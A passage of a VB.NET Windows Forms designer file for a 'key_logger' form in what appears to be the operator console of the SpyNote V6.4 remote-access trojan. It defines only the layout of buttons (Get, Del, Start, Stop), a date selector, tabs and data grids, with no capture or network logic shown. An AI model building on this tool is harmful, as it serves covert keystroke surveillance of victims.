<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class key_logger
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim DataGridViewCellStyle1 As System.Windows.Forms.DataGridViewCellStyle = New System.Windows.Forms.DataGridViewCellStyle()
        Dim DataGridViewCellStyle2 As System.Windows.Forms.DataGridViewCellStyle = New System.Windows.Forms.DataGridViewCellStyle()
        Dim DataGridViewCellStyle3 As System.Windows.Forms.DataGridViewCellStyle = New System.Windows.Forms.DataGridViewCellStyle()
        Dim DataGridViewCellStyle4 As System.Windows.Forms.DataGridViewCellStyle = New System.Windows.Forms.DataGridViewCellStyle()
        Me.BOXDOWN = New System.Windows.Forms.PictureBox()
        Me.ProgressBar1 = New SpyNote_V6._4.SN.ThemeProgressBar()
        Me.PNLERRORS = New System.Windows.Forms.Panel()
        Me.LBER = New System.Windows.Forms.Label()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.SplitContainer1 = New System.Windows.Forms.SplitContainer()
        Me.ThemeButton2 = New SpyNote_V6._4.SN.ThemeButton()
        Me.ThemeButton1 = New SpyNote_V6._4.SN.ThemeButton()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.SLLOG = New SpyNote_V6._4.SN.ThemeCoBox()
        Me.ThemeButton4 = New SpyNote_V6._4.SN.ThemeButton()
        Me.ThemeButton3 = New SpyNote_V6._4.SN.ThemeButton()
        Me.ThemeTabControl1 = New SpyNote_V6._4.SN.ThemeTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.PINFO = New System.Windows.Forms.Panel()
        Me.PCNOTF = New System.Windows.Forms.PictureBox()
        Me.ViewManager = New System.Windows.Forms.DataGridView()
        Me.Column1 = New System.Windows.Forms.DataGridViewImageColumn()
        Me.Column2 = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.VisualStudioHorizontalScrollBar1 = New SpyNote_V6._4.SN.VisualStudioHorizontalScrollBar()
        Me.VisualStudioVerticalScrollBar1 = New SpyNote_V6._4.SN.VisualStudioVerticalScrollBar()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.DataGridView1 = New System.Windows.Forms.DataGridView()
        Me.DataGridViewImageColumn1 = New System.Windows.Forms.DataGridViewImageColumn()
        Me.DataGridViewTextBoxColumn1 = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.VisualStudioHorizontalScrollBar2 = New SpyNote_V6._4.SN.VisualStudioHorizontalScrollBar()
        Me.VisualStudioVerticalScrollBar2 = New SpyNote_V6._4.SN.VisualStudioVerticalScrollBar()
        Me.TScrolls = New System.Windows.Forms.Timer(Me.components)
        Me.TProgressBar = New System.Windows.Forms.Timer(Me.components)
        Me.Trans = New System.Windows.Forms.Timer(Me.components)
        Me.SELCT_LOG = New System.Windows.Forms.ContextMenuStrip(Me.components)
        CType(Me.BOXDOWN, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.PNLERRORS.SuspendLayout()
        Me.Panel1.SuspendLayout()
        CType(Me.SplitContainer1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SplitContainer1.Panel1.SuspendLayout()
        Me.SplitContainer1.Panel2.SuspendLayout()
        Me.SplitContainer1.SuspendLayout()
        CType(Me.SLLOG, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ThemeTabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.PINFO.SuspendLayout()
        CType(Me.PCNOTF, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.ViewManager, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        Me.Panel2.SuspendLayout()
        CType(Me.DataGridView1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'BOXDOWN
        '
        Me.BOXDOWN.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.BOXDOWN.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.BOXDOWN.Location = New System.Drawing.Point(0, 405)
        Me.BOXDOWN.Name = "BOXDOWN"
        Me.BOXDOWN.Size = New System.Drawing.Size(594, 18)
        Me.BOXDOWN.TabIndex = 0
        Me.BOXDOWN.TabStop = False
        '
        'ProgressBar1
        '
        Me.ProgressBar1.Animated = True
        Me.ProgressBar1.Colour0 = System.Drawing.Color.FromArgb(CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer))
        Me.ProgressBar1.Colour1 = System.Drawing.Color.FromArgb(CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer))
        Me.ProgressBar1.Customization = "AAAAAAAAAAAAAAAAAAAAAA=="
        Me.ProgressBar1.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.ProgressBar1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ProgressBar1.Image = Nothing
        Me.ProgressBar1.Location = New System.Drawing.Point(0, 395)
        Me.ProgressBar1.Maximum = 100
        Me.ProgressBar1.Minimum = 0
        Me.ProgressBar1.Name = "ProgressBar1"
        Me.ProgressBar1.NoRounding = False
        Me.ProgressBar1.Size = New System.Drawing.Size(594, 10)
        Me.ProgressBar1.TabIndex = 3
        Me.ProgressBar1.Text = "ThemeProgressBar1"
        Me.ProgressBar1.Transparent = False
        Me.ProgressBar1.Value = 0
        '
        'PNLERRORS
        '
        Me.PNLERRORS.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.PNLERRORS.Controls.Add(Me.LBER)
        Me.PNLERRORS.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.PNLERRORS.Location = New System.Drawing.Point(0, 376)
        Me.PNLERRORS.Name = "PNLERRORS"
        Me.PNLERRORS.Size = New System.Drawing.Size(594, 19)
        Me.PNLERRORS.TabIndex = 4
        Me.PNLERRORS.Visible = False
        '
        'LBER
        '
        Me.LBER.AutoSize = True
        Me.LBER.Dock = System.Windows.Forms.DockStyle.Left
        Me.LBER.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.LBER.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.LBER.Location = New System.Drawing.Point(0, 0)
        Me.LBER.Name = "LBER"
        Me.LBER.Size = New System.Drawing.Size(37, 15)
        Me.LBER.TabIndex = 0
        Me.LBER.Text = "Errors"
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(63, Byte), Integer), CType(CType(63, Byte), Integer), CType(CType(70, Byte), Integer))
        Me.Panel1.Controls.Add(Me.SplitContainer1)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(594, 34)
        Me.Panel1.TabIndex = 5
        '
        'SplitContainer1
        '
        Me.SplitContainer1.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.SplitContainer1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SplitContainer1.Location = New System.Drawing.Point(0, 0)
        Me.SplitContainer1.Name = "SplitContainer1"
        '
        'SplitContainer1.Panel1
        '
        Me.SplitContainer1.Panel1.Controls.Add(Me.ThemeButton2)
        Me.SplitContainer1.Panel1.Controls.Add(Me.ThemeButton1)
        Me.SplitContainer1.Panel1.Controls.Add(Me.Label1)
        Me.SplitContainer1.Panel1.Controls.Add(Me.SLLOG)
        '
        'SplitContainer1.Panel2
        '
        Me.SplitContainer1.Panel2.Controls.Add(Me.ThemeButton4)
        Me.SplitContainer1.Panel2.Controls.Add(Me.ThemeButton3)
        Me.SplitContainer1.Size = New System.Drawing.Size(594, 34)
        Me.SplitContainer1.SplitterDistance = 424
        Me.SplitContainer1.TabIndex = 0
        '
        'ThemeButton2
        '
        Me.ThemeButton2.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ThemeButton2.BackColorDown0_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton2.BackColorDown1_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton2.BackColorNone0_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton2.BackColorNone1_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton2.BackColorOver0_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton2.BackColorOver1_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton2.ButtonBackColorEnabled0_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton2.ButtonBackColorEnabled1_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton2.ButtonForColor_S = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.ThemeButton2.ButtonForColorEnabled_S = System.Drawing.Color.FromArgb(CType(CType(83, Byte), Integer), CType(CType(83, Byte), Integer), CType(CType(90, Byte), Integer))
        Me.ThemeButton2.Buttonselected_Color_ForColor_S = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.ThemeButton2.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!)
        Me.ThemeButton2.ImageAlignment = SpyNote_V6._4.SN.ThemeButton.__ImageAlignment.Left
        Me.ThemeButton2.ImageChoice = Nothing
        Me.ThemeButton2.Location = New System.Drawing.Point(340, 7)
        Me.ThemeButton2.Name = "ThemeButton2"
        Me.ThemeButton2.ShowImage = False
        Me.ThemeButton2.ShowText = True
        Me.ThemeButton2.Size = New System.Drawing.Size(66, 20)
        Me.ThemeButton2.TabIndex = 25
        Me.ThemeButton2.Tag = ""
        Me.ThemeButton2.Text = "Del"
        Me.ThemeButton2.TextAlignment = System.Drawing.StringAlignment.Center
        Me.ThemeButton2.ThemeButtonclrBorder_S = System.Drawing.Color.FromArgb(CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer))
        Me.ThemeButton2.ThemeButtonclrBorderactive_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.ThemeButton2.ThemeButtonclrBorderEnabled_S = System.Drawing.Color.FromArgb(CType(CType(68, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(75, Byte), Integer))
        '
        'ThemeButton1
        '
        Me.ThemeButton1.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ThemeButton1.BackColorDown0_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton1.BackColorDown1_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton1.BackColorNone0_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton1.BackColorNone1_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton1.BackColorOver0_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton1.BackColorOver1_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton1.ButtonBackColorEnabled0_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton1.ButtonBackColorEnabled1_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton1.ButtonForColor_S = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.ThemeButton1.ButtonForColorEnabled_S = System.Drawing.Color.FromArgb(CType(CType(83, Byte), Integer), CType(CType(83, Byte), Integer), CType(CType(90, Byte), Integer))
        Me.ThemeButton1.Buttonselected_Color_ForColor_S = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.ThemeButton1.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!)
        Me.ThemeButton1.ImageAlignment = SpyNote_V6._4.SN.ThemeButton.__ImageAlignment.Left
        Me.ThemeButton1.ImageChoice = Nothing
        Me.ThemeButton1.Location = New System.Drawing.Point(268, 7)
        Me.ThemeButton1.Name = "ThemeButton1"
        Me.ThemeButton1.ShowImage = False
        Me.ThemeButton1.ShowText = True
        Me.ThemeButton1.Size = New System.Drawing.Size(66, 20)
        Me.ThemeButton1.TabIndex = 24
        Me.ThemeButton1.Tag = ""
        Me.ThemeButton1.Text = "Get"
        Me.ThemeButton1.TextAlignment = System.Drawing.StringAlignment.Center
        Me.ThemeButton1.ThemeButtonclrBorder_S = System.Drawing.Color.FromArgb(CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer))
        Me.ThemeButton1.ThemeButtonclrBorderactive_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.ThemeButton1.ThemeButtonclrBorderEnabled_S = System.Drawing.Color.FromArgb(CType(CType(68, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(75, Byte), Integer))
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(9, 10)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(35, 15)
        Me.Label1.TabIndex = 23
        Me.Label1.Text = "Date:"
        '
        'SLLOG
        '
        Me.SLLOG.BackColor = System.Drawing.Color.Transparent
        Me.SLLOG.Enabled = False
        Me.SLLOG.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!)
        Me.SLLOG.Location = New System.Drawing.Point(53, 7)
        Me.SLLOG.MlinColorovr = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(98, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.SLLOG.MyArrwBackColorOvr = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer))
        Me.SLLOG.MyArrwColorNone = System.Drawing.Color.FromArgb(CType(CType(153, Byte), Integer), CType(CType(153, Byte), Integer), CType(CType(153, Byte), Integer))
        Me.SLLOG.MyArrwColorOvr = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(98, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.SLLOG.MyBackColorNone = System.Drawing.Color.FromArgb(CType(CType(51, Byte), Integer), CType(CType(51, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.SLLOG.MyBackColorOver = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
        Me.SLLOG.MyBordColor = System.Drawing.Color.FromArgb(CType(CType(67, Byte), Integer), CType(CType(67, Byte), Integer), CType(CType(70, Byte), Integer))
        Me.SLLOG.MyFontColor = System.Drawing.Color.FromArgb(CType(CType(206, Byte), Integer), CType(CType(206, Byte), Integer), CType(CType(207, Byte), Integer))
        Me.SLLOG.MylinColorNone = System.Drawing.Color.FromArgb(CType(CType(67, Byte), Integer), CType(CType(67, Byte), Integer), CType(CType(70, Byte), Integer))
        Me.SLLOG.Name = "SLLOG"
        Me.SLLOG.Size = New System.Drawing.Size(189, 20)
        Me.SLLOG.TabIndex = 0
        Me.SLLOG.TabStop = False
        Me.SLLOG.TxText = "n/a"
        '
        'ThemeButton4
        '
        Me.ThemeButton4.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ThemeButton4.BackColorDown0_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton4.BackColorDown1_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton4.BackColorNone0_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton4.BackColorNone1_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton4.BackColorOver0_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton4.BackColorOver1_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton4.ButtonBackColorEnabled0_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton4.ButtonBackColorEnabled1_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton4.ButtonForColor_S = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.ThemeButton4.ButtonForColorEnabled_S = System.Drawing.Color.FromArgb(CType(CType(83, Byte), Integer), CType(CType(83, Byte), Integer), CType(CType(90, Byte), Integer))
        Me.ThemeButton4.Buttonselected_Color_ForColor_S = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.ThemeButton4.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!)
        Me.ThemeButton4.ImageAlignment = SpyNote_V6._4.SN.ThemeButton.__ImageAlignment.Left
        Me.ThemeButton4.ImageChoice = Nothing
        Me.ThemeButton4.Location = New System.Drawing.Point(15, 7)
        Me.ThemeButton4.Name = "ThemeButton4"
        Me.ThemeButton4.ShowImage = False
        Me.ThemeButton4.ShowText = True
        Me.ThemeButton4.Size = New System.Drawing.Size(66, 20)
        Me.ThemeButton4.TabIndex = 27
        Me.ThemeButton4.Tag = ""
        Me.ThemeButton4.Text = "Start"
        Me.ThemeButton4.TextAlignment = System.Drawing.StringAlignment.Center
        Me.ThemeButton4.ThemeButtonclrBorder_S = System.Drawing.Color.FromArgb(CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer))
        Me.ThemeButton4.ThemeButtonclrBorderactive_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.ThemeButton4.ThemeButtonclrBorderEnabled_S = System.Drawing.Color.FromArgb(CType(CType(68, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(75, Byte), Integer))
        '
        'ThemeButton3
        '
        Me.ThemeButton3.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ThemeButton3.BackColorDown0_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton3.BackColorDown1_S = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.ThemeButton3.BackColorNone0_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton3.BackColorNone1_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeButton3.BackColorOver0_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton3.BackColorOver1_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeButton3.ButtonBackColorEnabled0_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton3.ButtonBackColorEnabled1_S = System.Drawing.Color.FromArgb(CType(CType(53, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.ThemeButton3.ButtonForColor_S = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.ThemeButton3.ButtonForColorEnabled_S = System.Drawing.Color.FromArgb(CType(CType(83, Byte), Integer), CType(CType(83, Byte), Integer), CType(CType(90, Byte), Integer))
        Me.ThemeButton3.Buttonselected_Color_ForColor_S = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.ThemeButton3.Enabled = False
        Me.ThemeButton3.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!)
        Me.ThemeButton3.ImageAlignment = SpyNote_V6._4.SN.ThemeButton.__ImageAlignment.Left
        Me.ThemeButton3.ImageChoice = Nothing
        Me.ThemeButton3.Location = New System.Drawing.Point(87, 7)
        Me.ThemeButton3.Name = "ThemeButton3"
        Me.ThemeButton3.ShowImage = False
        Me.ThemeButton3.ShowText = True
        Me.ThemeButton3.Size = New System.Drawing.Size(66, 20)
        Me.ThemeButton3.TabIndex = 26
        Me.ThemeButton3.Tag = ""
        Me.ThemeButton3.Text = "Stop"
        Me.ThemeButton3.TextAlignment = System.Drawing.StringAlignment.Center
        Me.ThemeButton3.ThemeButtonclrBorder_S = System.Drawing.Color.FromArgb(CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer), CType(CType(85, Byte), Integer))
        Me.ThemeButton3.ThemeButtonclrBorderactive_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.ThemeButton3.ThemeButtonclrBorderEnabled_S = System.Drawing.Color.FromArgb(CType(CType(68, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(75, Byte), Integer))
        '
        'ThemeTabControl1
        '
        Me.ThemeTabControl1.BorderColor_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeTabControl1.Controls.Add(Me.TabPage1)
        Me.ThemeTabControl1.Controls.Add(Me.TabPage2)
        Me.ThemeTabControl1.DefaultBackColor_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.ThemeTabControl1.DefaultColor0_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeTabControl1.DefaultColor1_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ThemeTabControl1.DefaultForColor_S = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.ThemeTabControl1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.ThemeTabControl1.FForColorSelcted_S = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.ThemeTabControl1.ItemSize = New System.Drawing.Size(25, 25)
        Me.ThemeTabControl1.Location = New System.Drawing.Point(0, 34)
        Me.ThemeTabControl1.MouseOver0_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.ThemeTabControl1.MouseOver1_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.ThemeTabControl1.Multiline = True
        Me.ThemeTabControl1.Name = "ThemeTabControl1"
        Me.ThemeTabControl1.SelectedIndex = 0
        Me.ThemeTabControl1.Size = New System.Drawing.Size(594, 342)
        Me.ThemeTabControl1.TabIndex = 6
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.PINFO)
        Me.TabPage1.Location = New System.Drawing.Point(4, 29)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(586, 309)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Ofline"
        '
        'PINFO
        '
        Me.PINFO.Controls.Add(Me.PCNOTF)
        Me.PINFO.Controls.Add(Me.ViewManager)
        Me.PINFO.Controls.Add(Me.VisualStudioHorizontalScrollBar1)
        Me.PINFO.Controls.Add(Me.VisualStudioVerticalScrollBar1)
        Me.PINFO.Dock = System.Windows.Forms.DockStyle.Fill
        Me.PINFO.Location = New System.Drawing.Point(3, 3)
        Me.PINFO.Name = "PINFO"
        Me.PINFO.Size = New System.Drawing.Size(580, 303)
        Me.PINFO.TabIndex = 0
        '
        'PCNOTF
        '
        Me.PCNOTF.ErrorImage = Nothing
        Me.PCNOTF.InitialImage = Nothing
        Me.PCNOTF.Location = New System.Drawing.Point(56, 96)
        Me.PCNOTF.Name = "PCNOTF"
        Me.PCNOTF.Size = New System.Drawing.Size(131, 68)
        Me.PCNOTF.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.PCNOTF.TabIndex = 11
        Me.PCNOTF.TabStop = False
        Me.PCNOTF.Visible = False
        '
        'ViewManager
        '
        Me.ViewManager.AllowUserToAddRows = False
        Me.ViewManager.AllowUserToDeleteRows = False
        Me.ViewManager.AllowUserToResizeColumns = False
        Me.ViewManager.AllowUserToResizeRows = False
        Me.ViewManager.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells
        Me.ViewManager.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells
        Me.ViewManager.BackgroundColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ViewManager.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.ViewManager.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.[Single]
        DataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
        DataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
